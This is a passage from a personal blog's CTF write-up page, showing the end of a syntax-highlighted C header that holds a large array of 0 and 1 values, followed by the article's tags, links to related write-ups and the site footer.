</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span></code></pre></div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ctf/">CTF</a>
        
            <a href="/tags/reverse/">Reverse</a>
        
            <a href="/tags/pwn/">Pwn</a>
        
            <a href="/tags/crypto/">Crypto</a>
        
    </section>


    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            Last updated on Feb 21, 2022 09:46 CST
        </span>
    </section></footer>


    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="">
    <a href="/post/dasctf-2021-09-writeup/">
        
        

        <div class="article-details">
            <h2 class="article-title">DASCTF 2021-09 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/reversing-kr-writeups/">
        
        
            <div class="article-image">
                <img src="/post/reversing-kr-writeups/cover.07c1f3179b8f0141d5ce48710bd6353e_hu34624e491264541cebc0dd205ae52fb1_4568716_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Reversing.kr writeups"
                        
                        data-hash="md5-B8HzF5uPAUHVzkhxC9Y1Pg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Reversing.kr writeups</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/two-challenges-in-kctf2021-fall/">
        
        
            <div class="article-image">
                <img src="/post/two-challenges-in-kctf2021-fall/cover.0b0ad36cc36e9ebeffd01954c29b4cf8_hu426b1b4a5db42755d6b1974ac308773d_4005062_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Two Challenges in KCTF2021 Fall"
                        
                        data-hash="md5-CwrTbMNunr7/0BlUwptM&#43;A==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Two Challenges in KCTF2021 Fall</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/all-solves-during-a-weekend/">
        
        
            <div class="article-image">
                <img src="/post/all-solves-during-a-weekend/cover.45c645cb247d02096eaa24c4cc16f453_hu9fbd6f3e94fcae560a952561592fc022_254866_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post All Solves During a Weekend"
                        
                        data-hash="md5-RcZFyyR9AgluqiTEzBb0Uw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">All Solves During a Weekend</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/dragonctf-runofthemill-writeup/">
        
        

        <div class="article-details">
            <h2 class="article-title">DragonCTF Runofthemill Writeup</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy;
        
        2024 s0uthwood&#39;s Blog
    
        
            <br />
            已运行 <i class="fas fa-bell"></i> <a id="days">0</a> 天
        
    
        
            &nbsp;&nbsp;
            
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
            
            ⌨&nbsp;
            86.36k&nbsp;
            字
            &nbsp;&nbsp;
            🧠&nbsp;
            38&nbsp;
            篇文章
        
    </section>

    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>

    
        <script>
            var s1 = "2020-11-15";
            s1 = new Date(s1.replace(/-/g, "/"));
            s2 = new Date();
            var days = s2.getTime() - s1.getTime();
            var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
            document.getElementById('days').innerHTML = number_of_days;
        </script>
    
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
